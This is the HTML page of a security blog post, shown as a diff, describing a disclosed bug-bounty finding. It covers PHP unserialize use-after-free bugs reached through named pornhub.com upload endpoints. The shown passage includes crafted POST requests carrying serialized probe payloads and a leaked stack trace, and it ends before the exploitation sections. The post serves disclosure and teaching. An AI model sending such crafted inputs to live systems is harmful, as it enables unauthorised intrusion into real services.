@@ -1,0 +1,1928 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<!-- This site is optimized with the Yoast SEO plugin v4.9 - https://yoast.com/wordpress/plugins/seo/ -->
+<title>How we broke PHP, hacked Pornhub and earned $20,000 | Bug Bounties - Evonide</title>
+<meta name="description" content="We audited Pornhub, then PHP and broke both. In particular, we have gained remote code execution on pornhub.com and have earned a $20,000 bug bounty."/>
+<link rel="canonical" href="https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/" />
+<!-- / Yoast SEO plugin. -->
+
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Evonide&#039;s Information Security Blog &raquo; Feed" href="https://www.evonide.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Evonide&#039;s Information Security Blog &raquo; Comments Feed" href="https://www.evonide.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Evonide&#039;s Information Security Blog &raquo; How we broke PHP, hacked Pornhub and earned $20,000 Comments Feed" href="https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.evonide.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.8"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,56826,8203,55356,56819),0,0),c=j.toDataURL(),b===c&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55358,56794,8205,9794,65039),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55358,56794,8203,9794,65039),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='yarppWidgetCss-css'  href='https://www.evonide.com/wp-content/plugins/yet-another-related-posts-plugin/style/widget.css?ver=4.8' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-css'  href='https://www.evonide.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-bncplus-modified-css'  href='https://www.evonide.com/wp-content/uploads/crayon-syntax-highlighter/themes/bncplus-modified/bncplus-modified.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monospace-css'  href='https://www.evonide.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monospace.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='toc-screen-css'  href='https://www.evonide.com/wp-content/plugins/table-of-contents-plus/screen.min.css?ver=1509' type='text/css' media='all' />
+<link rel='stylesheet' id='wpt-twitter-feed-css'  href='https://www.evonide.com/wp-content/plugins/wp-to-twitter/css/twitter-feed.css?ver=4.8' type='text/css' media='all' />
+<link rel='stylesheet' id='easy_table_style-css'  href='https://www.evonide.com/wp-content/plugins/easy-table/themes/default/style.css?ver=1.6' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery-1.5.2.min.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery-ui.min.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/superfish.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/custom.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery.prettyPhoto.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/tabs.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery.carouFredSel-6.1.0-packed.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery.easing.1.3.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery.tipTip.minified.js?ver=4.8'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/themes/Broadcast/scripts/js/jquery.tabify.js?ver=4.8'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/www.evonide.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
+<link rel='https://api.w.org/' href='https://www.evonide.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.evonide.com/xmlrpc.php?rsd" />
+<link rel='shortlink' href='https://www.evonide.com/?p=1872' />
+<link rel="alternate" type="application/json+oembed" href="https://www.evonide.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.evonide.com%2Fhow-we-broke-php-hacked-pornhub-and-earned-20000-dollar%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.evonide.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.evonide.com%2Fhow-we-broke-php-hacked-pornhub-and-earned-20000-dollar%2F&#038;format=xml" />
+<style type='text/css'>
+	.spoiler { border: 1px #000 dashed; }
+	.spoiler legend { padding-right: 5px; background: white;  }
+	.spoiler legend input { width: 30px; }
+	.spoiler div { margin: 0px; overflow: hidden; height: 0; }
+	</style>
+<link rel="icon" href="/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/fonts/stylesheet.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/style.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/firstnavigation.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/secondnavigation.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/carousel.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/tipTip.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/tabs.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/styles/dark/categories.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/featured_long_slider.css" />
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/prettyPhoto.css" />
+<!--[if gt IE 7]>
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/ie7.css">
+<![endif]-->
+<!--[if IE]>
+<link rel="stylesheet" type="text/css" href="https://www.evonide.com/wp-content/themes/Broadcast/scripts/css/ie.css">
+<![endif]-->
+<style type="text/css">
+/* Custom Css Colors */
+.list_category h2{color:#ff4400 !important;}
+.list_post h2{color:#ff4400 !important;}
+#right h2{color:#ff4400 !important;}
+.rightwidget h2 a{color:#ff4400 !important;}
+a.cat_arrow{background:#ff4400 url('https://www.evonide.com/wp-content/themes/Broadcast/images/category_arrow.png')  !important;}
+a:hover.cat_arrow{background:#1f1f1f url('https://www.evonide.com/wp-content/themes/Broadcast/images/category_arrow.png')  !important;}
+.list_category h2 a{color:#ff4400 !important;}
+h1.fontface {font: 53px 'ColaborateBoldRegular', Arial, sans-serif; color:#222222;}
+#footer h5{color:#ff4400; !important}
+#left h1{color:#ff4400; !important}
+a.featured_button{background:#ff4400 !important;}
+.list_post div.readm div.button a{background:#ff4400 !important;}
+</style>
+
+
+</head>
+<body>
+
+
+
+<div id="header_container">
+
+<div id="header">
+
+<a href="https://www.evonide.com/"><img src="https://www.evonide.com/wp-content/themes/Broadcast/images/logo.png" width="262" height="66" class="logo" alt="Evonide&#039;s Information Security Blog"/></a>
+<p class="site_logo_text fontface">Information Security News and Projects</p>
+
+</div><!-- #header -->
+
+</div><!-- #header_container -->
+
+<div id="categories_container">
+
+<div id="categories">
+ <ul class="secondnav-menu">
+
+<li class="home_first_line"><a href="https://www.evonide.com/" class="home_second_line">Home</a></li>
+
+<li class="">
+    <a class="" href="https://www.evonide.com/categories/">Categories</a>
+<ul style="display: none; visibility: hidden;">
+	<li class="cat-item cat-item-63"><a href="https://www.evonide.com/category/bug-bounties/" title="Write-ups about hacks which were awarded with a bug bounty e.g. over Hackerone.">Bug Bounties</a>
+</li>
+	<li class="cat-item cat-item-39"><a href="https://www.evonide.com/category/cryptography/" title="Everything that has to do with breaking algorithms, encryption and other cryptography related stuff.">Cryptography</a>
+</li>
+	<li class="cat-item cat-item-44"><a href="https://www.evonide.com/category/guide/" title="Guides for projects which also can be non-security related.">Guides</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="https://www.evonide.com/category/security-research/" title="General news about Security Research.">Security Research</a>
+</li>
+</ul>
+</li>
+
+<li class="page_item page-item-2"><a href="https://www.evonide.com/about-me/">About Me</a></li>
+
+
+</ul>
+
+<form method="get" id="searchform" action="https://www.evonide.com">
+    <input class="search" name="s" id="s" value="" type="text" />
+    <input class="searchb" value="" type="submit" />
+</form>
+
+</div><!-- #categories -->
+
+
+
+
+</div><!-- categories container -->
+
+<div id="center">
+
+<div id="container">
+
+<div id="content">
+
+
+
+
+<div id="content_bg">
+
+
+<div id="left" >
+
+
+<div class="page_heading blog_single_header no_margin_top"><h1>How we broke PHP, hacked Pornhub and earned $20,000</h1></div>
+
+<div class="blog_date">
+
+<div class="the_date">
+
+<p> Written By:  <a href="https://www.evonide.com/author/admin/" title="Posts by Ruslan Habalov" rel="author">Ruslan Habalov</a></p> <span class="seperator">|</span>   
+
+<p>July 23, 2016 </p> <span class="seperator">|</span>  
+
+<p>Posted In: </p> <ul class="post-categories">
+	<li><a href="https://www.evonide.com/category/bug-bounties/" rel="category tag">Bug Bounties</a></li></ul>
+</div><!-- #the_date -->
+
+</div><!-- #date -->
+
+
+
+<div class="thumb">
+
+
+
+<div class="wp-caption">
+<a href="https://www.evonide.com/wp-content/uploads/2016/06/pornhub_bug_bounty_program-1024x512.jpg" title="How we broke PHP, hacked Pornhub and earned $20,000" rel="prettyPhoto[inline]"><img src="https://www.evonide.com/wp-content/uploads/2016/06/pornhub_bug_bounty_program-1024x512_single.jpg" width="581" height="252" alt="How we broke PHP, hacked Pornhub and earned $20,000" class="blog_single_img imgf"/></a>
+<p class="wp-caption-text">
+(c) <a href="https://creativecommons.org/licenses/by-nc-sa/2.0/" target="_blank">cc-by-nc-sa</a> | <a href="https://www.flickr.com/photos/135518748@N08/26414809274/" target="_blank">Portal Gda</a></p>
+</div>
+
+
+
+</div><!-- #thumb -->
+
+<div class="pure_content">
+
+
+
+
+<p style="text-align: justify;">It all started by auditing Pornhub, then PHP and ended in breaking both&#8230;</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;"><strong>tl;dr:<br />
+</strong></p>
+<ul style="text-align: justify;">
+<li>We have gained remote code execution on pornhub.com and have earned a $20,000 bug bounty on <a href="https://hackerone.com/reports/141956" target="_blank">Hackerone</a>.</li>
+<li>We have found two use-after-free vulnerabilities in PHP&#8217;s garbage collection algorithm.</li>
+<li>Those vulnerabilities were remotely exploitable over PHP&#8217;s unserialize function.</li>
+<li>We were also awarded with $2,000 by the Internet Bug Bounty committee (c.f. <a href="https://hackerone.com/evonide" target="_blank">Hackerone</a>).</li>
+</ul>
+<p>&nbsp;</p>
+<p style="text-align: justify;"><strong>Credits:</strong></p>
+<p style="text-align: justify;">This project was realized by Dario Weißer (<a href="https://twitter.com/haxonaut" target="_blank">@haxonaut</a>), <a href="https://twitter.com/@_cutz" target="_blank">cutz</a> and Ruslan Habalov (<a href="https://twitter.com/evonide" target="_blank">@evonide</a>). Many thanks go out to cutz for co-authoring this article.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">Pornhub&#8217;s bug bounty program and its relatively high rewards on <a href="https://hackerone.com/pornhub" target="_blank">Hackerone</a> caught our attention. That&#8217;s why we have taken the perspective of an advanced attacker with the full intent to get as deep as possible into the system, focusing on one main goal: gaining remote code execution capabilities. Thus, we left no stone unturned and attacked what Pornhub is built upon: PHP.</p>
+<p>&nbsp;</p>
+<div id="toc_container" class="no_bullets"><p class="toc_title">Contents</p><ul class="toc_list"><li><a href="#Bug_discovery"><span class="toc_number toc_depth_1">1</span> Bug discovery</a></li><li><a href="#Bug_description"><span class="toc_number toc_depth_1">2</span> Bug description</a><ul><li><a href="#Fuzzing_unserialize"><span class="toc_number toc_depth_2">2.1</span> Fuzzing unserialize</a></li><li><a href="#Analyzing_unexpected_behavior"><span class="toc_number toc_depth_2">2.2</span> Analyzing unexpected behavior</a></li></ul></li><li><a href="#Exploitation"><span class="toc_number toc_depth_1">3</span> Exploitation</a><ul><li><a href="#Leaking_the_PHP_binary_and_required_pointers"><span class="toc_number toc_depth_2">3.1</span> Leaking the PHP binary and required pointers</a><ul><li><a href="#Preparing_thememory_disclosure"><span class="toc_number toc_depth_3">3.1.1</span> Preparing the memory disclosure</a></li><li><a href="#Finding_PHP8217s_image_base"><span class="toc_number toc_depth_3">3.1.2</span> Finding PHP&#8217;s image base</a></li><li><a href="#Leaking_interesting_PHP_binary_segments"><span class="toc_number toc_depth_3">3.1.3</span> Leaking interesting PHP binary segments</a></li><li><a href="#Leaking_the_address_of_our_POSTdata"><span class="toc_number toc_depth_3">3.1.4</span> Leaking the address of our POST data</a></li></ul></li><li><a href="#Preparing_the_ROP_payload"><span class="toc_number toc_depth_2">3.2</span> Preparing the ROP payload</a><ul><li><a href="#Taking_overthe_instruction_pointer"><span class="toc_number toc_depth_3">3.2.1</span> Taking over the instruction pointer</a></li><li><a href="#Leaking_ROP_gadgets"><span class="toc_number toc_depth_3">3.2.2</span> Leaking ROP gadgets</a></li><li><a href="#Verifying_the_presence_of_the_required_ROP_gadgets"><span class="toc_number toc_depth_3">3.2.3</span> Verifying the presence of the required ROP gadgets</a></li><li><a href="#Crafting_the_ROPstack"><span class="toc_number toc_depth_3">3.2.4</span> Crafting the ROP stack</a></li></ul></li><li><a href="#Returning_into_PHP"><span class="toc_number toc_depth_2">3.3</span> Returning into PHP</a><ul><li><a href="#Clean_termination_of_PHP"><span class="toc_number toc_depth_3">3.3.1</span> Clean termination of PHP</a></li></ul></li></ul></li><li><a href="#Timeline"><span class="toc_number toc_depth_1">4</span> Timeline</a></li><li><a href="#Conclusion"><span class="toc_number toc_depth_1">5</span> Conclusion</a></li></ul></div>
+<h3 style="text-align: justify;"><span id="Bug_discovery">Bug discovery</span></h3>
+<p style="text-align: justify;">After analyzing the platform we quickly detected the usage of <a href="http://php.net/manual/en/function.unserialize.php" target="_blank">unserialize</a> on the website. Multiple paths (everywhere where you could upload hot pictures and so on) were affected for example:</p>
+<ul>
+<li style="text-align: justify;">http://www.pornhub.com/album_upload/create</li>
+<li style="text-align: justify;">http://www.pornhub.com/uploading/photo</li>
+</ul>
+<p style="text-align: justify;">In all cases a parameter named &#8220;cookie&#8221; got unserialized from POST data and afterwards reflected via Set-Cookie headers. Example Request:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500c8699803591" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+POST /album_upload/create HTTP/1.1
+...
+tags=xyz&amp;title=xyz...&amp;cookie=a:1:{i:0;i:1337;}
+
+Response Header:
+Set-Cookie: 0=1337; expires </textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500c8699803591-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500c8699803591-2">2</div><div class="crayon-num" data-line="crayon-59661681500c8699803591-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500c8699803591-4">4</div><div class="crayon-num" data-line="crayon-59661681500c8699803591-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500c8699803591-6">6</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500c8699803591-1">POST /album_upload/create HTTP/1.1</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500c8699803591-2">...</div><div class="crayon-line" id="crayon-59661681500c8699803591-3">tags=xyz&amp;title=xyz...&amp;cookie=a:1:{i:0;i:1337;}</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500c8699803591-4">&nbsp;</div><div class="crayon-line" id="crayon-59661681500c8699803591-5">Response Header:</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500c8699803591-6">Set-Cookie: 0=1337; expires </div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0000 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">This could be further verified by sending a specially crafted array that contained an object:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500cd321191065" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+tags=xyz&amp;title=xyz...&amp;cookie=a:1:{i:0;O:9:"Exception":0:{}}</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500cd321191065-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500cd321191065-1">tags=xyz&amp;title=xyz...&amp;cookie=a:1:{i:0;O:9:"Exception":0:{}}</div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0000 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Response layout:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500d0736418948" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+0=exception 'Exception' in /path/to/a/file.php:1337
+ Stack trace:
+ #0 /path/to/a/file.php(1337): unserialize('a:1:{i:0;O:9:"E...')
+ #1 {main}</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500d0736418948-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500d0736418948-2">2</div><div class="crayon-num" data-line="crayon-59661681500d0736418948-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500d0736418948-4">4</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500d0736418948-1">0=exception 'Exception' in /path/to/a/file.php:1337</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500d0736418948-2"> Stack trace:</div><div class="crayon-line" id="crayon-59661681500d0736418948-3"> #0 /path/to/a/file.php(1337): unserialize('a:1:{i:0;O:9:"E...')</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500d0736418948-4"> #1 {main}</div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0000 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">This might strike as a harmless information disclosure at first sight, but generally it is known that using user input on unserialize is a bad idea:</p>
+<ul style="text-align: justify;">
+<li><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf" target="_blank">ROP in PHP applications</a></li>
+<li><a href="https://www.nds.rub.de/media/hfs/attachments/files/2010/03/hackpra09_fu_esser_php_exploits1.pdf" target="_blank">Shocking News in PHP Exploitation</a></li>
+</ul>
+<p style="text-align: justify;">Standard exploitation techniques require so called Property-Oriented-Programming (POP) that involve abusing already existing classes with specifically defined &#8220;magic methods&#8221; in order to trigger unwanted and malicious code paths. Unfortunately, it was difficult for us to gather any information about Pornhub&#8217;s used frameworks and PHP objects in general. Multiple classes from common frameworks have been tested &#8212; all without success.</p>
+<h3 style="text-align: justify;"><span id="Bug_description">Bug description</span></h3>
+<p style="text-align: justify;">The core unserializer alone is relatively complex as it involves more than 1200 lines of code in PHP 5.6. Further, many internal PHP classes have their own unserialize methods. By supporting structures like objects, arrays, integers, strings or even references it is no surprise that PHP&#8217;s track record shows a tendency for bugs and memory corruption vulnerabilities. Sadly, there were no known vulnerabilities of such type for newer PHP versions like PHP 5.6 or PHP 7, especially because unserialize already got a lot of attention in the past (e.g. <a href="https://github.com/80vul/phpcodz" target="_blank">phpcodz</a>). Hence, auditing it can be compared to squeezing an already tightly squeezed lemon. Finally, after so much attention and so many security fixes its vulnerability potential should have been drained out and it should be secure, shouldn&#8217;t it?</p>
+<h4 style="text-align: justify;"><span id="Fuzzing_unserialize">Fuzzing unserialize</span></h4>
+<p style="text-align: justify;">To find an answer Dario implemented a fuzzer crafted specifically for fuzzing serialized strings which were passed to unserialize. Running the fuzzer with PHP 7 immediately lead to unexpected behavior. This behavior was not reproducible when tested against Pornhub&#8217;s server though. Thus, we assumed a PHP 5 version.</p>
+<p style="text-align: justify;">However, running the fuzzer against a newer version of PHP 5 just generated more than 1 TB of logs without any success. Eventually, after putting more and more effort into fuzzing we&#8217;ve stumbled upon unexpected behavior again. Several questions had to be answered: is the issue security related? If so can we only exploit it locally or also remotely? To further complicate this situation the fuzzer did generate non-printable data blobs with sizes of more than 200 KB.</p>
+<h4 style="text-align: justify;"><span id="Analyzing_unexpected_behavior">Analyzing unexpected behavior</span></h4>
+<p style="text-align: justify;">A tremendous amount of time was necessary to analyze potential issues. After all, we could extract a concise proof of concept of a working memory corruption bug &#8212; a so called <a href="https://www.owasp.org/index.php/Using_freed_memory" target="_blank">use-after-free</a> vulnerability! Upon further investigation we discovered that the root cause could be found in PHP&#8217;s garbage collection algorithm, a component of PHP that is completely unrelated to unserialize. However, the interaction of both components occurred only after unserialize had finished its job. Consequently, it was not well suited for remote exploitation. After further analysis, gaining a deeper understanding for the problem&#8217;s root causes and a lot of hard work a similar use-after-free vulnerability was found that seemed to be promising for remote exploitation.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">Vulnerability links:</p>
+<ul>
